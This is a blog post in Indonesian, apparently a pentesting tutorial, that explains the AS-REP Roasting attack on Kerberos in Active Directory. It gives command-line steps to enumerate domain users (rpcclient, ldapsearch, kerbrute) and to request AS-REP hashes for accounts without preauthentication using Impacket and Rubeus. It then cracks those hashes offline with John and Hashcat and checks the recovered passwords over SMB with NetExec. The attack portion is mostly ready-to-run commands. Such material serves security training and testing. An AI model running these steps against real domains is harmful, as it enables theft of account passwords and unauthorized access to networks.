---
layout: post
title: "Kerberos: AS-REP Roasting Attack (Active Directory)"
date: 2024-01-05 07:00:00 +0700
categories: "Active-Directory-Pentesting"
---

AS-REP Roasting adalah teknik serangan yang mengeksploitasi kelemahan dalam sistem otentikasi Kerberos di lingkungan Active Directory. Dengan serangan ini, Attacker mencoba memperoleh TGT (Ticket Granting Ticket) dari User dengan memanfaatkan AS-REP (tanggapan) yang dihasilkan oleh Kerberos. Serangan ini dapat dilakukan meskipun **tanpa otentikasi** atau dengan kata lain **tanpa perlu menggunakan password User yang rentan**.

**Mengapa bisa terjadi?**

Hal ini terjadi dikarenakan User yang rentan terhadap AS-REP Roasting itu mengaktifkan konfigurasi `Do not require Kerberos preauthentication`.

![Do not require Kerberos preauthentication](https://github.com/xchopath/www.novr.one/assets/44427665/8c045741-dcff-4d81-b579-c935c720fba9)

Jika AS-REP berhasil didapatkan, maka Attacker akan mencoba mengurai isi dari TGT tersebut untuk mendapatkan password yang terkandung di dalam TGT-nya, hal ini dapat dilakukan dengan metode seperti Brute Force yang dilakukan secara offline.

Yang harus kita ketahui:
- Authentication Server Request (AS-REQ)
- Authentication Server Response (AS-REP)
- Ticket Granting Ticket (TGT)
- Kerberos Preauthentication

<br/>

# Hunting Domain Users

## Recon

1. RPCClient
```sh
rpcclient <ip domain controller> -N
enumdomusers
```

2. ldapsearch
```sh
ldapsearch -x -H 'ldap://<ip domain controller>' -b "dc=<host domain>,dc=<tld>" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}'
```

## User Enumeration

Install kerbrute
```
go install github.com/ropnop/kerbrute@latest
sudo mv ~/go/bin/kerbrute /usr/local/bin/
```

Run
```
kerbrute userenum <users list file> --domain <domain> --dc <ip domain controller>
```

![kerbrute](https://github.com/xchopath/www.novr.one/assets/44427665/598efc12-1a8a-4d4a-9bd7-dca975589bf9)

<br/>

-----

<br/>

# AS-REP Roasting

## 1. Do AS-REQ to get AS-REP

Terdapat berbagai macam cara dan berbagai macam Tool untuk melakukan AS-REQ.

### Using Impacket

Install
```
sudo apt install impacket-scripts -y
```

Run
```sh
impacket-GetNPUsers <domain>/<user> -dc-ip <ip domain controller> -request -no-pass
```

![Impacket AS-REP Roasting](https://github.com/xchopath/www.novr.one/assets/44427665/62e4f21f-c1e1-4a60-9cb0-3806a7666ba6)


### Using Rubeus

Install
- <https://github.com/GhostPack/Rubeus>

Run
```
Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
```

<br/>

## 2. Cracking AS-REP (Roasting)

### Using John

Command
```sh
john --wordlist=<passwords file> <as-rep file>
```

![AS-REP Roasting with JOHN](https://github.com/xchopath/www.novr.one/assets/44427665/cd92cfa1-6bf2-4330-878a-04159a5b9a6f)

### Using Hashcat

Command
```sh
hashcat -m 18200 -a 0 <as-rep file> <passwords file>
```

![Hashcat AS-REP Roasting 1](https://github.com/xchopath/www.novr.one/assets/44427665/f87fff78-dd05-476f-9766-799ff7a0bc68)

![Hashcat AS-REP Roasting 2](https://github.com/xchopath/www.novr.one/assets/44427665/fd922647-de8b-4f95-8845-68dae3304675)

<br/>

-----

<br/>

# Test Authentication

## Using NetExec (FKA CrackMapExec) via SMB Port 445

Install
```
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
sudo pip3 install .
```

Run
```
NetExec smb <ip target> -u <username> -p <password>
```

![NetExec](https://github.com/xchopath/www.novr.one/assets/44427665/71125f62-12a5-46ca-9a6f-a46650dd8b06)
